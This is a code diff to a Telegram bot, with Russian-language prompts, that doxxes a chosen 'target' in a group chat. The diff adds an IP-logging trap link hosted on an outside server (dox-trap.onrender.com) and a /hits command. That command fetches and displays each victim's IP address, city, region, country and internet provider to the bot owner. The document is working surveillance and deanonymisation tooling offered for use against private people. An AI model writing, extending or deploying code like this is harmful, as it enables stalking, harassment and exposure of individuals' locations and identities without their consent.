@@ -1,4 +1,4 @@
-import os, sqlite3, asyncio
+import os, sqlite3, asyncio, requests
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message
 from aiogram.filters import Command
@@ -6,6 +6,7 @@ from aiogram.client.default import DefaultBotProperties
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 OWNER_ID  = int(os.getenv("OWNER_ID", "0"))
+TRAP_URL  = os.getenv("TRAP_URL", "https://dox-trap.onrender.com")
 
 bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp  = Dispatcher()
@@ -75,7 +76,9 @@ async def start(m: Message):
         "1. Добавь меня в чат с целью\n"
         "2. Свайпни влево по её сообщению (Reply)\n"
         "3. Напиши <code>.dox</code>\n\n"
-        "Отчёт пришлю тебе в личку."
+        "Ссылка-ловушка:\n"
+        f"<code>{TRAP_URL}/g/метка</code>\n\n"
+        "Показать переходы: <code>.hits</code>"
     )
 
 @dp.message(F.text.startswith(".dox"))
@@ -91,9 +94,33 @@ async def dox_cmd(m: Message):
     except Exception:
         pass
     try:
-        await bot.send_message(OWNER_ID, menu(tg, lk), disable_web_page_preview=False)
+        await bot.send_message(OWNER_ID, menu(tg, lk), disable_web_page_preview=True)
     except Exception:
         await m.answer("Напиши боту в личку /start")
+
+@dp.message(Command("hits"))
+async def hits_cmd(m: Message):
+    if m.from_user.id != OWNER_ID:
+        return
+    try:
+        r = requests.get(f"{TRAP_URL}/hits", timeout=15).json()
+    except Exception as e:
+        await m.answer(f"Ловушка не отвечает: {e}")
+        return
+    if not r:
+        await m.answer("Хитов пока нет.")
+        return
+    lines = ["<b>▸ HITS</b> (последние 10)"]
+    for h in r[-10:]:
+        lines.append(
+            f"\n<b>{h.get('ts','')[:19]}</b>\n"
+            f"метка: <code>{h.get('uid','')}</code>\n"
+            f"IP: <code>{h.get('ip','')}</code>\n"
+            f"город: {h.get('city','')}, {h.get('region','')}\n"
+            f"страна: {h.get('country','')}\n"
+            f"провайдер: {h.get('isp','')}"
+        )
+    await m.answer("\n".join(lines))
 
 @dp.message(F.contact)
 async def on_contact(m: Message):
